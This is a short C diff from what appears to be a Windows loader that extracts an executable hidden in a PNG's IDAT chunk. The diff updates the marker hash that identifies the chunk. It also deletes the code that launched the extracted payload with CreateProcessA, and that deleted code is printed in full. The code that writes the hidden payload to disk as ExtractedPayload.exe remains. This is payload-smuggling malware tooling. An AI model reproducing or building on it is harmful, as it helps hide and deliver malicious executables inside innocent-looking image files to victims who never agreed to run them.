@@ -18,7 +18,7 @@
 // TO UPDATE with respect to every new created PNG:
 //
 //
-#define MARKED_IDAT_HASH	0xFDEDDD8F
+#define MARKED_IDAT_HASH	0x95D80576
 
 // ---------------------------------------------------------------------------------------------------------------------------------------------
 // ---------------------------------------------------------------------------------------------------------------------------------------------
@@ -297,26 +297,4 @@ int main() {
 
 	// Write extracted payload to disk
 	return WriteFileToDiskA("ExtractedPayload.exe", pExeFileBuffer, sExeFileSize) ? 0 : -1;
-
-	// Execute the extracted payload
-	STARTUPINFOA si;
-	PROCESS_INFORMATION pi;
-
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
-
-	if (!CreateProcessA(NULL, "ExtractedPayload.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-		printf("[!] CreateProcessA Failed With Error: %d \n", GetLastError());
-		return -1;
-	}
-
-	// Wait until child process exits.
-	WaitForSingleObject(pi.hProcess, INFINITE);
-
-	// Close process and thread handles.
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
-
-	return 0;
 }
